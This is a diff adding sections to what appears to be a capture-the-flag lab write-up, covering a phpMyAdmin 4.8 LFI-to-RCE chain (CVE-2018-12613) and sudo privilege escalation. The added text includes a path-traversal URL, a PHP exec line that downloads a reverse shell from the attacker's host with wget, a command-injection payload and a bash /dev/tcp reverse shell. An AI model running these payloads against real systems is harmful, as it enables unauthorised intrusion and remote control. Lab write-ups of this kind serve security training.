@@ -146,3 +146,67 @@ hashcat -a 0 -m 300 hash.txt rockyou.txt
 This logs into phpMyAdmin.
 
 ---
+
+## 6. Authenticated RCE via phpMyAdmin 4.8 LFI
+
+phpMyAdmin version was vulnerable to the well-known 2018 LFI -> RCE chain **(CVE-2018–12613)**.
+
+### 6.1 Retrieve PHP session name
+
+Executed:
+```
+select '<?php phpinfo(); ?>'
+```
+Found session ID in browser storage.
+
+### 6.2 Trigger Local File Inclusion
+```
+http://10.129.229.137/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_<ID>
+```
+`phpinfo` output confirms RCE capability.
+
+### 6.3 Deploy Reverse Shell
+1. Hosted PentestMonkey PHP Reverse shell `t.php` locally.
+2. Downloaded via SQL command dashboard in phpMyAdmin:
+```
+select '<?php exec("wget -O /var/www/html/shell.php http://10.10.14.9/t.php"); ?>'
+```
+3. Triggered shell:
+```
+http://10.129.229.137/shell.php
+```
+Shell obtained as www-data.
+
+---
+
+## 7. Privilege Escalation to User "pepper"
+
+### 7.1 Enumerating sudo rules
+Discovered sudo rules:
+```
+sudo -l
+```
+
+`simpler.py` located under `/var/www/Admin-Utilities/` is runnable as pepper using:
+```
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
+
+### 7.2 Command injection via simpler.py
+
+Crafted payload:
+```
+$(bash /tmp/shell.sh)
+```
+
+Delivered reverse shell to attacker:
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.9/9001 0>&1
+```
+
+Shell obtained as user pepper. Flag `user.txt` found in `/home/pepper` directory.
+
+**User flag:** *REDACTED*
+
+---
